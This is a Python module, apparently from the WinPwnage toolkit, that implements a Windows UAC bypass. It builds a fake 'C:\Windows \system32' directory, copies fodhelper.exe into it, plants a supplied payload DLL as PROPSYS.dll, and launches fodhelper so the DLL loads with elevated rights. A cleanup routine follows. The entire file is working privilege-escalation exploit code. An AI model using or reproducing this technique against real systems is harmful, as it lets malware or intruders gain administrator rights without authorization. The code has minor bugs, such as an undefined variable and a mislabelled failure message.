import os
import time
import shutil
from winpwnage.core.prints import *
from winpwnage.core.utils import *

# https://github.com/tenable/poc/blob/master/Microsoft/Windows/UACBypass/UACBypass.cpp

mock_info = {
	"Description": "Bypass UAC using mock systemroot directory (dll payload)",
	"Id": "19",
	"Type": "UAC bypass",
	"Fixed In": "9999999" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uac_mockdir",
	"Function Payload": True,
}

# Manual cleaning:
# rmdir "C:\\Windows \\system32" /Q /S && rmdir "C:\\Windows \\"

def uac_mockdir_cleanup():
	print_info("Performing cleaning")
	dirs = [os.path.join(information().windows_directory().lower().strip("windows"),"Windows \\"),
				os.path.join(information().windows_directory().lower().strip("windows"),"Windows \\system32")]
				
	if os.path.isfile(os.path.join(dirs[1], "fodhelper.exe")):
		try:
			os.remove(os.path.join(dirs[1], "fodhelper.exe"))
		except Exception:
			print_warning("Unable to delete file ({target_bin})".format(target_bin=os.path.join(dirs[1],
							"fodhelper.exe")))
		else: 
			print_success("Successfully deleted file ({target_bin})".format(target_bin=os.path.join(dirs[1],
							"fodhelper.exe")))
	else:
		pass

	time.sleep(2)

	if os.path.isfile(os.path.join(dirs[1], "PROPSYS.dll")):
		try:
			os.remove(os.path.join(dirs[1], "PROPSYS.dll"))
		except Exception:
			print_warning("Unable to delete file ({target_dll})".format(target_dll=os.path.join(dirs[1],
							"PROPSYS.dll")))
		else:
			print_success("Successfully deleted file ({target_dll})".format(target_dll=os.path.join(dirs[1],
							"PROPSYS.dll")))
	else:
		pass

	time.sleep(2)

	if os.path.isdir(dirs[1]):
		try:
			shutil.rmtree(dirs[1])
		except Exception:
			print_warning("Unable to delete directory ({dir_path})".format(dir_path=dirs[1]))
		else:
			print_success("Successfully deleted directory ({dir_path})".format(dir_path=dirs[1]))
	else:
		pass

	time.sleep(2)

	if os.path.isdir(dirs[0]):
		try:
			shutil.rmtree(dirs[0])
		except Exception:
			print_warning("Unable to delete directory ({dir_path})".format(dir_path=dirs[0]))
		else:
			print_success("Successfully deleted directory ({dir_path})".format(dir_path=dirs[0]))
	else:
		pass

def uac_mockdir(payload):
	if payloads().dll(payload):
		dirs = [os.path.join(information().windows_directory().lower().strip("windows"),"Windows \\"),
				os.path.join(information().windows_directory().lower().strip("windows"),"Windows \\system32")]

		for d in dirs:
			try:
				os.mkdir(d)
			except OSError:
				print_warning("Directory already exists ({path}) using existing one".format(path=d))
			except Exception:
				print_error("Unable to create directory ({error})".format(error=error))
				if "error" in Constant.output:
					uac_mockdir_cleanup()
			else:
				print_success("Successfully created directory ({path})".format(path=d))

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			try:
				shutil.copyfile(os.path.join(information().system_directory(),
								"fodhelper.exe"), os.path.join(dirs[1], "fodhelper.exe"))
			except Exception:
				print_error("Unable to copy fodhelper.exe to directory ({path})".format(path=dirs[1]))
				if "error" in Constant.output:
					uac_mockdir_cleanup()
			else:
				print_success("Successfully copied fodhelper.exe to directory ({path})".format(path=dirs[1]))

		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception:
			print_error("Unable to read payload data")
			if "error" in Constant.output:
				uac_mockdir_cleanup()

		try:
			dll_file = open(os.path.join(dirs[1], "PROPSYS.dll"), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception:
			print_error("Unable to write payload to ({path})".format(path=os.path.join(dirs[1], "PROPSYS.dll")))
			if "error" in Constant.output:
				uac_mockdir_cleanup()
		else:
			print_success("Successfully wrote payload to ({path})".format(path=os.path.join(dirs[1], "PROPSYS.dll")))

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create(os.path.join(dirs[1], "fodhelper.exe"), window=True, get_exit_code=False):
				print_success("Successfully executed ({path})".format(path=os.path.join(dirs[1], "fodhelper.exe")))
			else:
				print_success("Unable to execute ({path})".format(path=os.path.join(dirs[1], "fodhelper.exe")))
				if "error" in Constant.output:
					uac_mockdir_cleanup()

		if uac_mockdir_cleanup():
			print_success("All done!")